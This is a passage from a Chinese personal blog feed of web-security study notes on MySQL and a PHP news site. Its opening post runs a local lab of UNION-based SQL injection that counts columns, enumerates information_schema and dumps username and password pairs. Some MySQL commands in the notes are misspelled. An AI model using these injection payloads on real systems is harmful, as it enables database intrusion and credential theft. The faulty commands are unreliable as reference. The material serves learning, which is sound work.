4,5;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/6content.png" alt></p><p>可以利用查到的库名表名字段名，查看对应的信息。</p><h3 id="三、网页上练习"><a href="#三、网页上练习" class="headerlink" title="三、网页上练习"></a>三、网页上练习</h3><h4 id="1-环境"><a href="#1-环境" class="headerlink" title="1. 环境"></a>1. 环境</h4><p>首先把<code>index.php</code>拷贝到工程文件中，用<code>phpstorm</code>打开文件，在<code>Terminal</code>输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 127.0.0.1:9000</span><br></pre></td></tr></table></figure><p>在浏览器中打开网页<code>http://127.0.0.1:9000/index.php</code></p><p>首页如下：</p><p><img src="/images/16page.png" alt></p><h4 id="2-前期工作"><a href="#2-前期工作" class="headerlink" title="2. 前期工作"></a>2. 前期工作</h4><p><code>index.php</code>显示程序如下：</p><p><img src="D:%5Cmyproject%5CBlog%5Csource%5Cimages%5C17programm.png" alt></p><p>可知，显示的读取数据的前三个。</p><p>在提交按钮输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 49;</span><br></pre></td></tr></table></figure><p><img src="/images/7orderby.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; order by 50;</span><br></pre></td></tr></table></figure><p><img src="/images/8error.png" alt></p><p>可知字段数为49。</p><h4 id="3-开始查询"><a href="#3-开始查询" class="headerlink" title="3. 开始查询"></a>3. 开始查询</h4><ul><li>查询库名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT version(), user(), (SELECT group_concat(schema_name) FROM information_schema.schemata),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/9schemaName.png" alt></p><ul><li>查询表名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/10testTableName.png" alt></p><ul><li>查询字段名</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/11ContentColName.png" alt></p><p>可以看出来有重复的字段名，这是因为两个不同库里均有<code>content</code>和<code>users</code>表。加上库名的限制就正常了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;content&apos; AND table_schema=&apos;test&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/11ContentColName1.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name=&apos;user&apos;),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><ul><li>查询数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT concat_ws(&apos;~&apos;, author, title)  FROM `test`.`content` LIMIT 0,1),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/13readContent.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(author, &apos;~&apos;,title)  FROM`test`.`content`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/14readContent.png" alt></p><p>同理也可查出<code>users</code>数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM `mysql`.`user` WHERE `user` = &apos;root&apos; UNION SELECT 1, 2, (SELECT group_concat(username, &apos;~&apos;, passwd)  FROM `test`.`users`),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49  LIMIT 1,1</span><br></pre></td></tr></table></figure><p><img src="/images/15readUse.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>highlight</title>
      <link href="/2019/08/13/highlight/"/>
      <url>/2019/08/13/highlight/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 解决<code>markdown</code>代码上传到<code>github</code>上不高亮的问题。</p><a id="more"></a><!--export--><h3 id="Syntax"><a href="#Syntax" class="headerlink" title="Syntax"></a>Syntax</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% codeblock [lang:language] [title] [url] [link text] %&#125;</span><br><span class="line">code snippet</span><br><span class="line">&#123;% endcodeblock %&#125;</span><br></pre></td></tr></table></figure><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight js"><figcaption><span>Javascript Array Syntax</span><a href="http://j.mp/pPUUmW" target="_blank" rel="noopener">MDN Documentation</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr1 = <span class="keyword">new</span> <span class="built_in">Array</span>(arrayLength);</span><br><span class="line"><span class="keyword">var</span> arr2 = <span class="keyword">new</span> <span class="built_in">Array</span>(element0, element1, ..., elementN);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">'foo'</span>;</span><br><span class="line"></span><br><span class="line">print(a);</span><br><span class="line"></span><br><span class="line"><span class="comment">#python dictionary</span></span><br><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Zara'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name=<span class="string">'content'</span>;</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$cars = <span class="keyword">array</span>(<span class="string">"Volvo"</span>, <span class="string">"BMW"</span>, <span class="string">"Toyota"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cars[<span class="number">0</span>];<span class="comment">//输出"Volvo"</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cars[<span class="number">1</span>];<span class="comment">//输出"BMW"</span></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $cars[<span class="number">2</span>];<span class="comment">//输出"Toyota"</span></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dict = &#123;<span class="string">'Name'</span>: <span class="string">'Zara'</span>, <span class="string">'Age'</span>: <span class="number">7</span>, <span class="string">'Class'</span>: <span class="string">'First'</span>&#125;</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Name']: "</span>, dict[<span class="string">'Name'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"dict['Age']: "</span>, dict[<span class="string">'Age'</span>]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> issue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习6</title>
      <link href="/2019/08/12/practice6/"/>
      <url>/2019/08/12/practice6/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: <code>MySQL</code>中<code>information_schema</code>库的使用</p><a id="more"></a><!--export--><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT schema_name FROM information_schema.schemata;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/databases.png" alt></p><p>显示出所有库名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;mynews&apos;;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/tables.png" alt></p><p>显示出<code>mynews</code>库中所有表名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;test&apos;;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/testTables.png" alt></p><p>找到目标，发现<code>test</code>库中有两张表<code>content</code>和<code>users</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&apos;users&apos;;</span><br></pre></td></tr></table></figure><p><img src="/images/columnsCon.png" alt></p><p>显示出<code>users</code>表中的字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT username, passwd FROM test.users;</span><br></pre></td></tr></table></figure><p>OUT</p><p><img src="/images/upUsers.png" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT column_name FROM information_schema.columns WHERE table_name=&apos;content&apos;;</span><br></pre></td></tr></table></figure><p><img src="/images/columns.png" alt></p><p>显示出<code>content</code>表中的字段。</p><p>OUT</p><p><img src="/images/tACon.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>note21</title>
      <link href="/2019/08/12/note21/"/>
      <url>/2019/08/12/note21/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 对<code>MySQL</code>数据库的简单介绍和基本操作包括创建数据库，读取数据库信息，创建表，对表中的数据进行增删改查。以及对<code>information_schema</code>表的理解。</p><a id="more"></a><!--export--><h3 id="一、MySQL数据库"><a href="#一、MySQL数据库" class="headerlink" title="一、MySQL数据库"></a>一、MySQL数据库</h3><p>MySQL是流行的关系型数据库管理系统。</p><ul><li>数据库：一些关联表的集合。</li><li>数据表：是数据的矩阵。</li><li>列：一列包含相同类型的数据，例如用户名数据。</li><li>行：一行是一组相关数据，例如一条用户订阅的数据。</li><li>主键：主键是唯一的，一个数据表中只能包含一个主键。可以用主键查询数据。</li><li>外键：外键用于关联两个表。</li></ul><h3 id="二、MySQL基础应用"><a href="#二、MySQL基础应用" class="headerlink" title="二、MySQL基础应用"></a>二、MySQL基础应用</h3><h4 id="1-关于数据库"><a href="#1-关于数据库" class="headerlink" title="1. 关于数据库"></a>1. 关于数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#创建数据库</span><br><span class="line">CREATE DATABASE mytest;</span><br><span class="line">#查看数据库</span><br><span class="line">SHOW DATABASES;</span><br><span class="line">#使用数据库</span><br><span class="line">USE mytest;</span><br></pre></td></tr></table></figure><h4 id="2-关于数据表"><a href="#2-关于数据表" class="headerlink" title="2. 关于数据表"></a>2. 关于数据表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#创建一个名为user的数据表</span><br><span class="line">CREATE TABLE `user`(</span><br><span class="line">`id` SMALLINT,</span><br><span class="line">    `username` VARCHAR(20),</span><br><span class="line">);</span><br><span class="line">#查看当前数据库中所有的数据表</span><br><span class="line">SHOW TABLES;</span><br><span class="line">#查看创建数据库时的描述</span><br><span class="line">SHOW CREATE TABLE user;</span><br><span class="line">#向user表中插入一条数据</span><br><span class="line">INSERT user VALUES(&apos;1&apos;, &apos;admin&apos;);</span><br><span class="line">#向user表中插入一条记录只包含名字的信息</span><br><span class="line">INSERT user(`username`) VALUES(&quot;cat&quot;);</span><br><span class="line">#向user表中同时插入多条记录</span><br><span class="line">INSERT user VALUES(&apos;2&apos;, &apos;zs&apos;), (&apos;3&apos;, &apos;ww&apos;);</span><br><span class="line">#查看数据表中的所有记录</span><br><span class="line">SELECT * FROM user;</span><br><span class="line">#修改数据表姓名</span><br><span class="line">ALERT TABLE admin RENAME TO nimda;</span><br><span class="line">#更改数据</span><br><span class="line">UPDATE nimda SET `id`=4;</span><br><span class="line">#删除数据表</span><br><span class="line">DROP TABLE user;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center">库名</th><th align="center">表名</th><th align="center">字段</th></tr></thead><tbody><tr><td align="center"></td><td align="center">用户名tb_users</td><td align="center">名字、密码、邮箱、昵称、创建时间等</td></tr><tr><td align="center">mynews</td><td align="center">新闻表tb_news</td><td align="center">标题、内容、作者</td></tr><tr><td align="center"></td><td align="center">评论表tb_comment</td><td align="center">新闻id、评论内容、评论用户</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">#创建新的数据库</span><br><span class="line">CREATE DATABASES mynews;</span><br><span class="line">#查看数据库</span><br><span class="line">SHOW DATABASE;</span><br><span class="line">#使用mynews库</span><br><span class="line">USE mynews;</span><br><span class="line">#创建一个名为tb_users表</span><br><span class="line">CREATE TABLE `tb_users`(</span><br><span class="line">    #id非空自增</span><br><span class="line">        `id` int(10) NOT NULL AUTO_INCREMENT,</span><br><span class="line">    #用户名非空唯一</span><br><span class="line">        `username` VARCHAR(50) NOT NULL UNIQUE,</span><br><span class="line">        `password` VARCHAR(50) NOT NULL,</span><br><span class="line">        `email` VARCHAR(50) NULL UNIQUE,</span><br><span class="line">        `nickname` VARCHAR(50) NOT NULL,</span><br><span class="line">        `safepoint` VARCHAR(50) NULL,</span><br><span class="line">    #头像默认</span><br><span class="line">        `avatarimg` VARCHAR(100) DEFAULT &apos;/images/default_avatar.jpg&apos;,</span><br><span class="line">    #时间</span><br><span class="line">        `reg_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP(),</span><br><span class="line">        `lastlogin_time` TIMESTAMP DEFAULT CURRENT_TIMESTAMP(),</span><br><span class="line">        `lastlogin_ip` VARCHAR(255) NULL,</span><br><span class="line">        PRIMARY KEY(`id`)</span><br><span class="line">);</span><br><span class="line">#向tb_users表插入一条数据</span><br><span class="line">INSERT INTO `mynews`.`tb_users`(`username`, `password`, `email`, `nickname`) VALUES (&apos;zs&apos;, &apos;zs123&apos;, &apos;zs123@icq.com&apos;, &apos;zs123&apos;)</span><br><span class="line"></span><br><span class="line">#创建一个名为tb_news表</span><br><span class="line">create table `tb_news`(</span><br><span class="line">    `id` int(0) not null auto_increment,</span><br><span class="line">    `title` varchar(255) not null,</span><br><span class="line">    `contents` text not null,</span><br><span class="line">    `author` varchar(50) not null,</span><br><span class="line">    `new_img` varchar(100) null,</span><br><span class="line">    `add_time` timestamp default current_timestamp(),</span><br><span class="line">    `hot` int(0) default 0,</span><br><span class="line">    primary key(`id`)</span><br><span class="line">);</span><br><span class="line">#向tb_news表插入数据</span><br><span class="line">INSERT INTO `mynews`.`tb_news`(`title`, `contents`, `author`) VALUES (&apos;打完宽面&apos;, &apos;吃面！吃面！&apos;, &apos;zs&apos;);</span><br><span class="line">INSERT INTO `mynews`.`tb_news`(`title`, `contents`, `author`) VALUES (&apos;鸡你太美&apos;, &apos;太美！太美！&apos;, &apos;ww&apos;);</span><br><span class="line"></span><br><span class="line">#创建一个名为tb_comment表</span><br><span class="line">create table `tb_comment`(</span><br><span class="line">    `id` int(0) not null auto_increment,</span><br><span class="line">    `new_id` int(0) not null,</span><br><span class="line">    `comment_content` text not null,</span><br><span class="line">    `comment_user` varchar(50) not null,</span><br><span class="line">    `comment_time` timestamp default current_timestamp(),</span><br><span class="line">    primary key(`id`)</span><br><span class="line">);</span><br><span class="line">#向tb_comment表插入数据</span><br><span class="line">INSERT INTO `mynews`.`tb_comment`(`new_id`, `comment_content`, `comment_user`) VALUES (&apos;1&apos;, &apos;吴亦凡&apos;, &apos;ww&apos;);</span><br><span class="line">INSERT INTO `mynews`.`tb_comment`(`new_id`, `comment_content`, `comment_user`) VALUES (&apos;2&apos;, &apos;坤坤&apos;, &apos;zs&apos;);</span><br><span class="line">#修改数据</span><br><span class="line">UPDATE `mynews`.`tb_news` SET `author` = &apos;ls&apos; WHERE `id` = 1;</span><br><span class="line">UPDATE `tb_comment` SET `comment_content` = &apos;蔡徐坤&apos; WHERE `id` = 2;</span><br><span class="line"></span><br><span class="line">ALTER TABLE `mynews`.`tb_users` ADD UNIQUE (`username`);</span><br></pre></td></tr></table></figure><h3 id="三、information-schema"><a href="#三、information-schema" class="headerlink" title="三、information_schema"></a>三、information_schema</h3><p><code>information_schema</code>这个数据库中保存了<code>MySQL</code>服务器所有数据库的信息。如数据库名，数据库的表，表中的数据类型与访问权限等。</p><table><thead><tr><th align="center">表名</th><th align="center">字段作用</th></tr></thead><tbody><tr><td align="center">schemata</td><td align="center">schema_name记录了所有数据库的名字</td></tr><tr><td align="center">tables</td><td align="center">table_schema记录了所有数据库的名字</td></tr><tr><td align="center">tables</td><td align="center">table_name记录了所有数据库的表的名字</td></tr><tr><td align="center">columns</td><td align="center">table_schema记录了所有数据库的名字</td></tr><tr><td align="center">columns</td><td align="center">table_name记录了所有数据库的表名字</td></tr><tr><td align="center">columns</td><td align="center">column_name记录了所有数据库的表的列的名字</td></tr></tbody></table><p>查询数据核心语法：</p><table><thead><tr><th align="center">功能名称</th><th align="left">查询语句</th></tr></thead><tbody><tr><td align="center">查库</td><td align="left">SELECT schema_name FROM information_schema.schemata</td></tr><tr><td align="center">查表</td><td align="left">SELECT table_name FROM information_schema.tables WHERE table_schema=库名</td></tr><tr><td align="center">查列</td><td align="left">SELECT column_name FROM information_schema.columns WHERE table_name=表明</td></tr><tr><td align="center">查数据</td><td align="left">SELECT 列名 FROM 库名.表名</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p mynews &lt; path</span><br><span class="line">mysqldump -uroot -p mysql &gt; path</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web Security </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>练习5</title>
      <link href="/2019/08/11/practice5/"/>
      <url>/2019/08/11/practice5/</url>
      
        <content type="html"><![CDATA[<p><strong>Abstract</strong>: 把新闻信息，用户信息存放在文件中，用对文件的读写，实现用户的登录注册以及对新闻的增删改查。</p><a id="more"></a><!--export--><h3 id="一、目录结构"><a href="#一、目录结构" class="headerlink" title="一、目录结构"></a>一、目录结构</h3><blockquote><p>###目录结构：</p><p>|            index.php                //初始化页面</p><p>|——–  data                         //文件存放目录</p><p>|            news.db                  //存放新闻信息文件</p><p>|            users.db                 //存放用户信息文件</p><p>|——— lib                            //脚本存放目录           </p><p>|            login.html              // 用户登录界面    </p><p>|            checklogin.php    //处理用户登录信息</p><p>|            logup.html            //用户注册界面</p><p>|           checkSignUp.php //处理用户注册信息</p><p>|           addNews.php       //添加新闻界面</p><p>|           del.php                  //删除新闻界面</p><p>|           upload.php          //上传头像界面 </p><p>|           getpasswd.php   //修改密码界面</p><p>|           checkpass.php    //对hgetpasswd.php发送的数据进行处理</p><p>|——– css                         //用户登录和注册界面的css目录</p><p>|           login.css               //用户登录的css</p><p>|          logup.css              //用户注册的css        </p><p>|——– upload                 //用户上传头像目录</p><p>|——– basedir                //存放页面头部尾部和一些公共函数</p><p>|           header.php        //页面头部</p><p>|           footer.php         //页面尾部</p><p>|           function.php     //定义了一些公共函数</p></blockquote><h3 id="二、新闻界面-index-php"><a href="#二、新闻界面-index-php" class="headerlink" title="二、新闻界面 index.php"></a>二、新闻界面 index.php</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;news&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;!--区分普通用户和管理员用户--&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if(isset($_SESSION[&apos;uname&apos;]))&#123;</span><br><span class="line">    echo &lt;&lt;&lt;EOF</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;img src=&quot;../images/logo.png&quot; height=&quot;100px&quot; width=&quot;100px&quot; style=&quot;float: left&quot;&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div style=&quot;float: right&quot;&gt;</span><br><span class="line">        &lt;img src=&apos;../upload/headimg.jpg&apos; height=&quot;60px&quot; width=&quot;60px&quot;&gt;</span><br><span class="line">        &lt;br&gt;</span><br><span class="line">        &lt;a href=&quot;../logout.php&quot;&gt;注销用户&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">EOF;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;h1 align=&quot;center&quot;&gt;ICQ新闻中心&lt;/h1&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;table align=&quot;center&quot;&gt;</span><br><span class="line">    &lt;tr&gt;</span><br><span class="line">        &lt;th&gt;热度&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;标题&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;作者&lt;/th&gt;</span><br><span class="line">        &lt;th&gt;时间&lt;/th&gt;</span><br><span class="line">    &lt;/tr&gt;</span><br><span class="line">    &lt;?php</span><br><span class="line">        //用只读方式打开news.db文件</span><br><span class="line">        $fhandle = fopen(&quot;./data/news1.db&quot;, &quot;r&quot;);</span><br><span class="line">        //设置一个计数器，小于3时，每个文章标题下面增加图片和简介</span><br><span class="line">        $top3Cnt=1;</span><br><span class="line">        while(!feof($fhandle)) &#123;</span><br><span class="line">            $fline = fgets($fhandle);</span><br><span class="line">            $data = explode(&apos;||&apos;, $fline);</span><br><span class="line">            @$title = base64_decode($data[1]);</span><br><span class="line">            @$content = base64_decode($data[2]);</span><br><span class="line">            @$date = $data[3];</span><br><span class="line">            @$author = base64_decode($data[4]);</span><br><span class="line">            @$hot = $data[5];</span><br><span class="line">            @$imgUrl = $data[6];</span><br><span class="line">            echo &lt;&lt;&lt;EOF</span><br><span class="line">        &lt;tr align=&quot;center&quot;&gt;</span><br><span class="line">            